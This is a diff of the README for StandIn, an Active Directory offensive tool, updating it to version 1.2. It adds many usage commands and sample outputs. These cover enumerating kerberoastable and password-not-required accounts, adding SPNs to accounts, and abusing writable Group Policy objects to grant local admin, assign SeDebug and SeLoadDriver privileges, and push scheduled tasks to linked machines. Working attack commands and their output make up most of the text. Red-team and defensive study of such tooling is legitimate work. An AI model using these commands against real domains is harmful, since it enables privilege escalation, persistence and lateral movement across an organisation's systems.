@@ -10,12 +10,18 @@ I want to continue developing StandIn to teach myself more about Directory Servi
 
 Contributions are most welcome. Please ensure pull requests include the following items: description of the functionality, brief technical explanation and sample output.
 
+Do you have something you want to see added to StandIn but don't have a PR? Please open a ticket and describe the functionality as best as possible.
+
 #### ToDo's
 
 The following items are currently on the radar for implementation in subsequent versions of StandIn.
 
 - Domain share enumeration. This can be split out into two parts, (1) finding and getting a unique list based on user home directories / script paths / profile paths and (2) querying fTDfs / msDFS-Linkv2 objects.
-- Finding and parsing GPO's to map users to host local groups. 
+- Finding and parsing GPO's to map users to host local groups.
+- GPO -> OU & OU -> GPO.
+- Rewrite policy function probably.
+- Adding optional JSON/XML output for some functions to help with scripting.
+- Code needs a re-factor, better modularized functions and split out into different classes.
 
 # Subject References
 
@@ -28,23 +34,38 @@ The following items are currently on the radar for implementation in subsequent 
 - Rubeus - [here](https://github.com/GhostPack/Rubeus)
 - Powerview - [here](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 - Powermad (by [@kevin_robertson](https://twitter.com/kevin_robertson)) - [here](https://github.com/Kevin-Robertson/Powermad)
+- SharpGPOAbuse (by [@den_n1s](https://twitter.com/den_n1s) & [@pkb1s](https://twitter.com/pkb1s)) - [here](https://github.com/FSecureLABS/SharpGPOAbuse)
+- adidnsdump (by [@_dirkjan](https://twitter.com/_dirkjan)) - [here](https://github.com/dirkjanm/adidnsdump)
 
 # Index
 - [Help](#help)
 - [LDAP Object Operations](#ldap-object-operations)
+    - [Raw LDAP](#raw-ldap)
     - [Get object](#get-object)
     - [Get object access permissions](#get-object-access-permissions)
     - [Grant object access permission](#grant-object-access-permission)
     - [Set object password](#set-object-password)
     - [Add ASREP to object flags](#addremove-asrep-from-object-flags)
     - [Remove ASREP from object flags](#addremove-asrep-from-object-flags)
+- [SID](#sid)
 - [ASREP](#asrep)
+- [PASSWD_NOTREQD](#passwd_notreqd)
 - [SPN](#spn)
+    - [SPN Collection](#spn-collection)
+    - [Set SPN](#set-spn)
 - [Unconstrained / constrained / resource-based constrained delegation](#unconstrained--constrained--resource-based-constrained-delegation)
 - [DC's](#dcs)
+- [GPO Operations](#gpo-operations)
+    - [List GPO's](#list-gpos)
+    - [GPO add local admin](#gpo-add-local-admin)
+    - [GPO add user privilege](#gpo-add-user-privilege)
+    - [GPO add immediate task](#gpo-add-immediate-task)
+    - [GPO increase User / Computer version](#gpo-increase-user--computer-version)
+- [Policy](#policy)
+- [DNS](#dns)
 - [Groups Operations](#groups-operations)
     - [List group membership](#list-group-membership)
-    - [Add user to group](#add-user-to-group)
+    - [Add / remove user from group](#add--remove-user-from-group)
 - [Machine Object Operations](#machine-object-operations)
     - [Create machine object](#create-machine-object)
     - [Disable machine object](#disable-machine-object)
@@ -52,45 +73,75 @@ The following items are currently on the radar for implementation in subsequent 
     - [Add msDS-AllowedToActOnBehalfOfOtherIdentity](#add-msds-allowedtoactonbehalfofotheridentity)
     - [Remove msDS-AllowedToActOnBehalfOfOtherIdentity](#remove-msds-allowedtoactonbehalfofotheridentity)
 - [Detection](#detection)
+- [Special Thanks](#special-thanks)
 
 ## Help
 
 ```
   __
  ( _/_   _//   ~b33f
-__)/(//)(/(/)  v0.8
+__)/(//)(/(/)  v1.2
 
 
  >--~~--> Args? <--~~--<
 
---help        This help menu
---object      LDAP filter, e.g. samaccountname=HWest
---computer    Machine name, e.g. Celephais-01
---group       Group name, e.g. "Necronomicon Admins"
---ntaccount   User name, e.g. "REDHOOK\UPickman"
---sid         String SID representing a target machine
---grant       User name, e.g. "REDHOOK\KMason"
---guid        Rights GUID to add to object, e.g. 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
---domain      Domain name, e.g. REDHOOK
---user        User name
---pass        Password
---newpass     New password to set for object
---type        Rights type: GenericAll, GenericWrite, ResetPassword, WriteMembers, DCSync
---spn         Boolean, list kerberoastable accounts
---delegation  Boolean, list accounts with unconstrained / constrained delegation
---asrep       Boolean, list ASREP roastable accounts
---dc          Boolean, list all domain controllers
---remove      Boolean, remove msDS-AllowedToActOnBehalfOfOtherIdentity property from machine object
---make        Boolean, make machine; ms-DS-MachineAccountQuota applies
---disable     Boolean, disable machine; should be the same user that created the machine
---access      Boolean, list access permissions for object
---delete      Boolean, delete machine from AD; requires elevated AD access
+--help          This help menu
+--object        LDAP filter, e.g. samaccountname=HWest
+--ldap          LDAP filter, can return result collection
+--filter        Filter results, varies based on function
+--limit         Limit results, varies based on function, defaults to 50
+--computer      Machine name, e.g. Celephais-01
+--group         samAccountName, e.g. "Necronomicon Admins"
+--ntaccount     User name, e.g. "REDHOOK\UPickman"
+--sid           Dependent on context
+--grant         User name, e.g. "REDHOOK\KMason"
+--guid          Rights GUID to add to object, e.g. 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
+--domain        Domain name, e.g. REDHOOK
+--user          User name
+--pass          Password
+--newpass       New password to set for object
+--gpo           List group policy objects
+--acl           Show ACL's for returned GPO's
+--localadmin    Add samAccountName to BUILTIN\Administrators for vulnerable GPO
+--setuserrights samAccountName for which to add token rights in a vulnerable GPO
+--tasktype      Immediate task type (user/computer)
+--taskname      Immediate task name
+--author        Immediate task author
+--command       Immediate task command
+--args          Immediate task command args
+--target        Optional, filter for DNS name or NTAccount
+--targetsid     Optional, provider user SID
+--increase      Increment either the user or computer GPO version number for the AD object
+--policy        Reads some account/kerberos properties from the "Default Domain Policy"
+--dns           Performs ADIDNS enumeration, supports wildcard filters
+--legacy        Boolean, sets DNS seach root to legacy (CN=System)
+--forest        Boolean, sets DNS seach root to forest (DC=ForestDnsZones)
+--passnotreq    Boolean, list accounts that have PASSWD_NOTREQD set
+--type          Rights type: GenericAll, GenericWrite, ResetPassword, WriteMembers, DCSync
+--spn           Boolean, list kerberoastable accounts
+--setspn        samAccountName for which to add/remove an SPN
+--principal     Principal name to add to samAccountName (e.g. MSSQL/VermisMysteriis)
+--delegation    Boolean, list accounts with unconstrained / constrained delegation
+--asrep         Boolean, list ASREP roastable accounts
+--dc            Boolean, list all domain controllers
+--add           Boolean, context dependent group/spn
+--remove        Boolean, context dependent msDS-AllowedToActOnBehalfOfOtherIdentity/group
+--make          Boolean, make machine; ms-DS-MachineAccountQuota applies
+--disable       Boolean, disable machine; should be the same user that created the machine
+--access        Boolean, list access permissions for object
+--delete        Boolean, delete machine from AD; requires elevated AD access
 
  >--~~--> Usage? <--~~--<
+
+# Perform LDAP search
+StandIn.exe --ldap "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
+StandIn.exe --ldap servicePrincipalName=* --domain redhook --user RFludd --pass Cl4vi$Alchemi4e --limit 10
+StandIn.exe --ldap servicePrincipalName=* --filter "pwdlastset, distinguishedname, lastlogon" --limit 100
 
 # Query object properties by LDAP filter
 StandIn.exe --object "(&(samAccountType=805306368)(servicePrincipalName=*vermismysteriis.redhook.local*))"
 StandIn.exe --object samaccountname=Celephais-01$ --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+StandIn.exe --object samaccountname=Celephais-01$ --filter "pwdlastset, serviceprincipalname, objectsid"
 
 # Query object access permissions, optionally filter by NTAccount
 StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --access
@@ -118,9 +169,54 @@ StandIn.exe --object samaccountname=RSuydam --asrep  --remove --domain redhook -
 StandIn.exe --asrep
 StandIn.exe --asrep --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
 
+# Return GPO objects, optionally wildcard filter and get ACL's
+StandIn.exe --gpo --limit 20
+StandIn.exe --gpo --filter admin --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+StandIn.exe --gpo --filter admin --acl --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Add samAccountName to BUILTIN\Administrators for vulnerable GPO
+StandIn.exe --gpo --filter ArcanePolicy --localadmin JCurwen
+StandIn.exe --gpo --filter ArcanePolicy --localadmin JCurwen --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Add token rights to samAccountName in a vulnerable GPO
+StandIn.exe --gpo --filter ArcanePolicy --setuserrights JCurwen --grant "SeTcbPrivilege,SeDebugPrivilege"
+StandIn.exe --gpo --filter ArcanePolicy --setuserrights JCurwen --grant SeLoadDriverPrivilege --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Add user/computer immediate task and optionally filter
+StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt"
+StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --target Rllyeh.redhook.local
+StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype user --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --target "REDHOOK\RBloch" --targetsid S-1-5-21-315358687-3711474269-2098994107-1106
+StandIn.exe --gpo --filter ArcanePolicy --taskname LiberInvestigationis --tasktype computer --author "REDHOOK\JCurwen" --command "C:\Windows\System32\notepad.exe" --args "C:\Mysteriis\CultesDesGoules.txt" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Increment either the user or computer GPO version number for the AD object
+StandIn.exe --gpo --filter ArcanePolicy --increase --tasktype user
+StandIn.exe --gpo --filter ArcanePolicy --increase --tasktype computer --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Read Default Domain Policy
+StandIn.exe --policy
+StandIn.exe --policy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Perform ADIDNS searches
+StandIn.exe --dns --limit 20
+StandIn.exe --dns --filter SQL --limit 10
+StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# List account that have PASSWD_NOTREQD set
+StandIn.exe --passnotreq
+StandIn.exe --passnotreq --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Get user and SID from either a SID or a samAccountName
+StandIn.exe --sid JCurwen
+StandIn.exe --sid S-1-5-21-315358687-3711474269-2098994107-1105 --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
 # Get a list of all kerberoastable accounts
 StandIn.exe --spn
 StandIn.exe --spn --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Add/remove SPN from samAccountName
+StandIn.exe --setspn RSuydam --principal MSSQL/VermisMysteriis --add
+StandIn.exe --setspn RSuydam --principal MSSQL/VermisMysteriis --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
 
 # List all accounts with unconstrained & constrained delegation privileges
 StandIn.exe --delegation
@@ -129,13 +225,18 @@ StandIn.exe --delegation --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
 # Get a list of all domain controllers
 StandIn.exe --dc
 
-# List group members
+# List members of group or list user group membership
 StandIn.exe --group Literarum
 StandIn.exe --group "Magna Ultima" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+StandIn.exe --group JCurwen --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
 
 # Add user to group
-StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley"
-StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley" --add
+StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --add --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+
+# Remove user from group
+StandIn.exe --group "Dunwich Council" --ntaccount "REDHOOK\WWhateley" --remove
+StandIn.exe --group DAgon --ntaccount "REDHOOK\RCarter" --remove --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
 
 # Create machine object
 StandIn.exe --computer Innsmouth --make
@@ -159,7 +260,52 @@ StandIn.exe --computer Miskatonic --remove --domain redhook --user RFludd --pass
 ```
 
 ## LDAP Object Operations
-All object operations expect that the LDAP filter returns a single object and will exit out if your query returns more. This is by design.
+All `--object` operations expect that the LDAP filter returns a single object and will exit out if your query returns more. This is by design. If you wish to pull back an array of objects you should use `--ldap`.
+
+### Raw LDAP
+
+#### Use Case
+
+> *Operationally, we may want to retrieve an array of AD object and optionally filter and/or limit the results and properties.*
+
+#### Syntax
+
+Get all properties of the resolved objects. Queries can be simple matches for a single property or complex LDAP filters. Optionally limit the results returned with `--limit`.
+
+```
+C:\> StandIn.exe --ldap "(&(displayName=*)(gpcfilesyspath=*))" --filter "gpcfilesyspath,versionnumber"
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[+] LDAP search result count : 3
+    |_ Result limit          : 50
+
+[?] Iterating result properties
+    |_ Applying property filter => gpcfilesyspath,versionnumber
+
+[?] Object   : CN={6AC1786C-016F-11D2-945F-00C04fB984F9}
+    Path     : LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=redhook,DC=local
+[+] versionnumber
+    |_ User Version     : 0
+    |_ Computer Version : 1
+[+] gpcfilesyspath
+    |_ \\redhook.local\sysvol\redhook.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
+
+[?] Object   : CN={31B2F340-016D-11D2-945F-00C04FB984F9}
+    Path     : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=redhook,DC=local
+[+] versionnumber
+    |_ User Version     : 0
+    |_ Computer Version : 11
+[+] gpcfilesyspath
+    |_ \\redhook.local\sysvol\redhook.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+
+[?] Object   : CN={58890948-8DE3-4A39-8C40-F68004186693}
+    Path     : LDAP://CN={58890948-8DE3-4A39-8C40-F68004186693},CN=Policies,CN=System,DC=redhook,DC=local
+[+] versionnumber
+    |_ User Version     : 2
+    |_ Computer Version : 4
+[+] gpcfilesyspath
+    |_ \\redhook.local\SysVol\redhook.local\Policies\{58890948-8DE3-4A39-8C40-F68004186693}
+```
 
 ### Get object
 
@@ -169,7 +315,7 @@ All object operations expect that the LDAP filter returns a single object and wi
 
 #### Syntax
 
-Get all properties of the resolved object. Queries can be simple matches for a single property or complex LDAP filters.
+Return the resolved object. Queries can be simple matches for a single property or complex LDAP filters. Optionally filter the properties you wish to pull back with `--filter`.
 
 ```
 C:\> StandIn.exe --object samaccountname=m-10-1909-01$
@@ -574,6 +720,36 @@ C:\> StandIn.exe --asrep
 [?] Found 0 object(s) that do not require Kerberos preauthentication..
 ```
 
+## SID
+
+#### Use Case
+
+> *Sometimes you have either a `SID` or `samAccountName` and you need to get the other. This is a simple helper function to do that for you.*
+
+#### Syntax
+
+Convert `SID` or `samAccountName` to the user `SID` and `NTAccount`.
+
+```
+C:\> StandIn.exe --sid user001
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[?] Object   : CN=user 001
+    Path     : LDAP://CN=user 001,CN=Users,DC=redhook,DC=local
+
+[+] User     : REDHOOK.LOCAL\user001
+    SID      : S-1-5-21-315358687-3711474269-2098994107-1105
+
+C:\> StandIn.exe --sid S-1-5-21-315358687-3711474269-2098994107-1105
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[?] Object   : CN=user 001
+    Path     : LDAP://CN=user 001,CN=Users,DC=redhook,DC=local
+
+[+] User     : REDHOOK.LOCAL\user001
+    SID      : S-1-5-21-315358687-3711474269-2098994107-1105
+```
+
 ## ASREP
 
 #### Use Case
@@ -596,7 +772,41 @@ C:\> StandIn.exe --asrep
     userAccountControl       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQUIRE_PREAUTH
 ```
 
+## PASSWD_NOTREQD
+
+#### Use Case
+
+> *This function enumerates all accounts in AD which are currently enabled and have `PASSWD_NOTREQD` as part of their `userAccountControl` flags. These accounts can have blank passwords despite GPO enforcement but they can also have a password configured.*
+
+#### Syntax
+
+Return all accounts that have `PASSWD_NOTREQD` set.
+
+```
+C:\> StandIn.exe --passnotreq
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+
+[?] Found 2 object(s) that do not require a password..
+
+[*] SamAccountName           : passnotreq
+    DistinguishedName        : CN=passnotreq,CN=Users,DC=redhook,DC=local
+    PwdLastSet               : 6/6/2021 10:47:27 PM UTC
+    lastlogon                : 0x0
+    userAccountControl       : PASSWD_NOTREQD, NORMAL_ACCOUNT
+
+[*] SamAccountName           : REDHOOKSLSRV$
+    DistinguishedName        : CN=RedHookSLSRV,CN=Computers,DC=redhook,DC=local
+    PwdLastSet               : 6/6/2021 10:51:37 PM UTC
+    lastlogon                : 0x0
+    userAccountControl       : PASSWD_NOTREQD, WORKSTATION_TRUST_ACCOUNT
+```
+
 ## SPN
+
+These functions deal specifically with SPN's.
+
+### SPN Collection
 
 #### Use Case
 
@@ -618,6 +828,69 @@ C:\> StandIn.exe --spn
     PwdLastSet             : 11/2/2020 7:06:17 PM UTC
     lastlogon              : 0x0
     Supported ETypes       : RC4_HMAC_DEFAULT
+```
+
+### Set SPN
+
+#### Use Case
+
+> *With the appropriate permissions, this function allows you to add and remove an `SPN` from a `samAccountName`.*
+
+#### Syntax
+
+Add and remove `SPN's` from a `samAccountName`.
+
+```
+C:\> StandIn.exe --setspn user001 --principal MSSQL/Alchimiae --add
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[?] Object   : CN=user 001
+    Path     : LDAP://CN=user 001,CN=Users,DC=redhook,DC=local
+
+[*] SamAccountName         : user001
+    DistinguishedName      : CN=user 001,CN=Users,DC=redhook,DC=local
+
+[+] Adding servicePrincipalName : MSSQL/Alchimiae
+    |_ Success
+
+C:\> StandIn.exe --object samaccountname=user001 --filter serviceprincipalname
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[?] Object   : CN=user 001
+    Path     : LDAP://CN=user 001,CN=Users,DC=redhook,DC=local
+
+[?] Iterating object properties
+    |_ Applying property filter => serviceprincipalname
+
+[+] serviceprincipalname
+    |_ HTTP/Alchimiae
+    |_ MSSQL/Alchimiae
+
+C:\>StandIn.exe --setspn user001 --principal HTTP/Alchimiae --remove
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[?] Object   : CN=user 001
+    Path     : LDAP://CN=user 001,CN=Users,DC=redhook,DC=local
+
+[*] SamAccountName         : user001
+    DistinguishedName      : CN=user 001,CN=Users,DC=redhook,DC=local
+    ServicePrincipalName   : HTTP/Alchimiae
+                             MSSQL/Alchimiae
+
+[+] Removing servicePrincipalName : HTTP/Alchimiae
+    |_ Success
+
+C:\> StandIn.exe --object samaccountname=user001 --filter serviceprincipalname
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[?] Object   : CN=user 001
+    Path     : LDAP://CN=user 001,CN=Users,DC=redhook,DC=local
+
+[?] Iterating object properties
+    |_ Applying property filter => serviceprincipalname
+
+[+] serviceprincipalname
+    |_ MSSQL/Alchimiae
 ```
 
 ## Unconstrained / constrained / resource-based constrained delegation
@@ -714,81 +987,420 @@ C:\> StandIn.exe --dc
     Local System Time UTC : Tuesday, 03 November 2020 03:29:17
 ```
 
+## GPO Operations
+
+These functions deal specifically with GPO manipulation.
+
+### List GPO's
+
+#### Use Case
+
+> *This function can enumerate all of the domain `Group Policy` objects. Optionally you can wildcard `--filter` and `--limit` the amount of entries returned. You can also query the ACL's for the GPO objects with `--acl`.*
+
+#### Syntax
+
+Enumerate GPO objects and review GPO ACL's.
+
+```
+C:\> StandIn.exe --gpo
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[+] GPO result count         : 3
+    |_ Result limit          : 50
+
+[?] Object   : CN={6AC1786C-016F-11D2-945F-00C04fB984F9}
+    Path     : LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=redhook,DC=local
+    DisplayName              : Default Domain Controllers Policy
+    CN                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+    GPCFilesysPath           : \\redhook.local\sysvol\redhook.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
+    GPCMachineExtensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
+    WhenCreated              : 6/3/2021 10:30:25 AM
+    WhenChanged              : 6/3/2021 10:30:25 AM
+
+[?] Object   : CN={31B2F340-016D-11D2-945F-00C04FB984F9}
+    Path     : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=redhook,DC=local
+    DisplayName              : Default Domain Policy
+    CN                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
+    GPCFilesysPath           : \\redhook.local\sysvol\redhook.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+    GPCMachineExtensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
+    WhenCreated              : 6/3/2021 10:30:25 AM
+    WhenChanged              : 6/5/2021 11:59:55 PM
+
+[?] Object   : CN={028A7368-C524-46AA-B27A-CE8BDAC4EA66}
+    Path     : LDAP://CN={028A7368-C524-46AA-B27A-CE8BDAC4EA66},CN=Policies,CN=System,DC=redhook,DC=local
+    DisplayName              : Shards
+    CN                       : {028A7368-C524-46AA-B27A-CE8BDAC4EA66}
+    GPCFilesysPath           : \\redhook.local\SysVol\redhook.local\Policies\{028A7368-C524-46AA-B27A-CE8BDAC4EA66}
+    GPCMachineExtensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
+    WhenCreated              : 6/4/2021 2:11:43 PM
+    WhenChanged              : 6/4/2021 11:33:33 PM
+
+C:\> StandIn.exe --gpo --filter Shards --acl
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+[+] GPO result count         : 1
+    |_ Result limit          : 50
+    |_ Applying search filter
+
+[?] Object   : CN={028A7368-C524-46AA-B27A-CE8BDAC4EA66}
+    Path     : LDAP://CN={028A7368-C524-46AA-B27A-CE8BDAC4EA66},CN=Policies,CN=System,DC=redhook,DC=local
+    GPCFilesysPath : \\redhook.local\SysVol\redhook.local\Policies\{028A7368-C524-46AA-B27A-CE8BDAC4EA66}
+    Path           : OK
+
+[+] Account       : CREATOR OWNER
+    Type          : Allow
+    Rights        : FullControl
+    Inherited ACE : False
+    Propagation   : InheritOnly
+
+[+] Account       : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
+    Type          : Allow
+    Rights        : ReadAndExecute, Synchronize
+    Inherited ACE : False
+    Propagation   : None
+
+[+] Account       : NT AUTHORITY\Authenticated Users
+    Type          : Allow
+    Rights        : ReadAndExecute, Synchronize
+    Inherited ACE : False
+    Propagation   : None
+
+[+] Account       : NT AUTHORITY\SYSTEM
+    Type          : Allow
+    Rights        : FullControl
+    Inherited ACE : False
+    Propagation   : None
+
+[+] Account       : REDHOOK\Domain Admins
+    Type          : Allow
+    Rights        : FullControl
+    Inherited ACE : False
+    Propagation   : None
+
+[+] Account       : REDHOOK\Enterprise Admins
+    Type          : Allow
+    Rights        : FullControl
+    Inherited ACE : False
+    Propagation   : None
+
+[+] Account       : REDHOOK\user001
+    Type          : Allow
+    Rights        : FullControl
+    Inherited ACE : False
+    Propagation   : None
+```
+
+### GPO add local admin
+
+> *With the appropriate permissions it is possible to add a domain user to the `BUILTIN\Administrators` on a vulnerable GPO.*
+
+#### Syntax
+
+Add user to to the `BUILTIN\Administrators` group for all linked computer objects tied to the `Shards` GPO. This function can both create the required files and also update existing files. **Use with caution.**
+
+```
+C:\> StandIn.exe --gpo --filter Shards --localadmin user002
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+
+[+] GPO Object Found
+    Object   : CN={58890948-8DE3-4A39-8C40-F68004186693}
+    Path     : LDAP://CN={58890948-8DE3-4A39-8C40-F68004186693},CN=Policies,CN=System,DC=redhook,DC=local
+    GP Path  : \\redhook.local\SysVol\redhook.local\Policies\{58890948-8DE3-4A39-8C40-F68004186693}
+
+[+] User Object Found
+    Object   : CN=user 002
+    Path     : LDAP://CN=user 002,CN=Users,DC=redhook,DC=local
+    SID      : S-1-5-21-315358687-3711474269-2098994107-1106
+
+[?] GPO Version
+    User     : 0
+    Computer : 0
+
+[+] Writing GPO changes
+    |_ Creating GptTmpl.inf
+    |_ Updating gpt.inf
+    |_ Updating AD object
+       |_ Incrementing version number
+       |_ Creating gPCMachineExtensionNames
+```
+
+### GPO add user privilege
+
+> *With the appropriate permissions it is possible to enable a token privilege for a domain user on a vulnerable GPO.*
+
+#### Syntax
+
+Add `token` privilege to a user account for all linked computer objects tied to the `Shards` GPO. This function can both create the required files and also update existing files. **Use with caution.**
+
+```
+C:\Users\user001\Desktop>StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"
+
+[+] Validating account rights
+    |_ Rights count: 2
+       |_ SeDebugPrivilege
+       |_ SeLoadDriverPrivilege
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+
+[+] GPO Object Found
+    Object   : CN={58890948-8DE3-4A39-8C40-F68004186693}
+    Path     : LDAP://CN={58890948-8DE3-4A39-8C40-F68004186693},CN=Policies,CN=System,DC=redhook,DC=local
+    GP Path  : \\redhook.local\SysVol\redhook.local\Policies\{58890948-8DE3-4A39-8C40-F68004186693}
+
+[+] User Object Found
+    Object   : CN=user 002
+    Path     : LDAP://CN=user 002,CN=Users,DC=redhook,DC=local
+    SID      : S-1-5-21-315358687-3711474269-2098994107-1106
+
+[?] GPO Version
+    User     : 0
+    Computer : 1
+
+[+] Writing GPO changes
+    |_ Updating existing GptTmpl.inf
+       |_ Adding GPO Privileges
+       |_ Updating revision
+    |_ Updating gpt.inf
+    |_ Updating AD object
+       |_ Incrementing version number
+       |_ Updating gPCMachineExtensionNames
+```
+
+### GPO add immediate task
+
+> *With the appropriate permissions it is possible to add an immediate task to either the `User` or `Computer` component of the GPO. Optionally, these tasks can be narrowed to apply to a single user or single computer.*
+
+#### Syntax
+
+Add a generic `Computer` task which will execute for all linked computer objects tied to the `Shards` GPO. Also add a targeted `User` task that will only execute for a specific domain user. This function can both create the required files and also update existing files. **Use with caution.**
+
+```
+C:\Users\user001\Desktop>StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+
+[+] GPO Object Found
+    Object   : CN={58890948-8DE3-4A39-8C40-F68004186693}
+    Path     : LDAP://CN={58890948-8DE3-4A39-8C40-F68004186693},CN=Policies,CN=System,DC=redhook,DC=local
+    GP Path  : \\redhook.local\SysVol\redhook.local\Policies\{58890948-8DE3-4A39-8C40-F68004186693}
+
+[?] GPO Version
+    User     : 0
+    Computer : 2
+
+[+] Writing GPO changes
+    |_ Creating ScheduledTasks.xml
+    |_ Updating gpt.inf
+    |_ Updating AD object
+       |_ Incrementing version number
+       |_ Updating gPCMachineExtensionNames
+
+C:\> StandIn.exe --gpo --filter Shards --tasktype user --taskname Ivonis --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args" --target "REDHOOK\user001" --targetsid S-1-5-21-315358687-3711474269-2098994107-1105
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+
+[+] GPO Object Found
+    Object   : CN={58890948-8DE3-4A39-8C40-F68004186693}
+    Path     : LDAP://CN={58890948-8DE3-4A39-8C40-F68004186693},CN=Policies,CN=System,DC=redhook,DC=local
+    GP Path  : \\redhook.local\SysVol\redhook.local\Policies\{58890948-8DE3-4A39-8C40-F68004186693}
+
+[?] GPO Version
+    User     : 0
+    Computer : 3
+
+[+] Writing GPO changes
+    |_ Creating ScheduledTasks.xml
+    |_ Updating gpt.inf
+    |_ Updating AD object
+       |_ Incrementing version number
+       |_ Creating gPCUserExtensionNames
+```
+
+### GPO increase user / computer version
+
+> *While the previous GPO functions offer powerful exploitation primitives it may be useful to have the ability to manually edit `GPO's` on `SysVol`. Once any GPO has been manually modified then the AD object version should be sync'd to correctly propagate the changes. This function does that.*
+
+#### Syntax
+
+Increase the `User` or `Computer` GPO version on the associated AD object.
+
+```
+C:\Users\user001\Desktop>StandIn.exe --gpo --filter Shards --increase --tasktype user
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+
+[+] GPO Object Found
+    Object   : CN={58890948-8DE3-4A39-8C40-F68004186693}
+    Path     : LDAP://CN={58890948-8DE3-4A39-8C40-F68004186693},CN=Policies,CN=System,DC=redhook,DC=local
+    GP Path  : \\redhook.local\SysVol\redhook.local\Policies\{58890948-8DE3-4A39-8C40-F68004186693}
+
+[?] Current GPO Versioning
+    User     : 1
+    Computer : 3
+
+--> Incrementing user version
+
+C:\Users\user001\Desktop>StandIn.exe --gpo --filter Shards --increase --tasktype computer
+
+[?] Using DC : m-w16-dc01.main.redhook.local
+
+[+] GPO Object Found
+    Object   : CN={58890948-8DE3-4A39-8C40-F68004186693}
+    Path     : LDAP://CN={58890948-8DE3-4A39-8C40-F68004186693},CN=Policies,CN=System,DC=redhook,DC=local
+    GP Path  : \\redhook.local\SysVol\redhook.local\Policies\{58890948-8DE3-4A39-8C40-F68004186693}
+
+[?] Current GPO Versioning
+    User     : 2
+    Computer : 3
+
+--> Incrementing computer version
+```
+
+## Policy
